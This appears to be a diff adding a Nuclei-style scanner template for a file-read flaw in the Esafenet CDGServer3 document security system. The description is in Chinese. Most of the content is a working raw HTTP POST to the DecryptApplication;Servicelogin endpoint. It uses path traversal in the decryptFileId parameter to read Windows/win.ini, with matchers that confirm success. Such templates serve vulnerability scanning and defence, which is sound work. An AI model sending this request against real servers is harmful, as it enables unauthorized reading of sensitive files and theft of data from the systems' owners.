@@ -1,0 +1,39 @@
+id: esafenet-cdgserver3-Servicelogin-decryptFileId-param-fileread
+info:
+  name: esafenet Servicelogin decryptFileId param fileread
+  author: leadlife
+  severity: high
+  description: 亿赛通电子文档安全管理系统的 DecryptApplication 接口ViewDecyptFile方法存在文件读取漏洞。攻击者可通过构造特定请求，利用该接口的 decryptFileId、filePath 等参数读取服务器上文件内容，从而获取敏感信息。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/uzibfn9k9cl7gn8f
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileread,esafenet
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 76
+
+        command=ViewDecyptFile&decryptFileId=../../../Windows/win.ini&fileName=1.png
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+
+      - type: status
+        status:
+          - 200
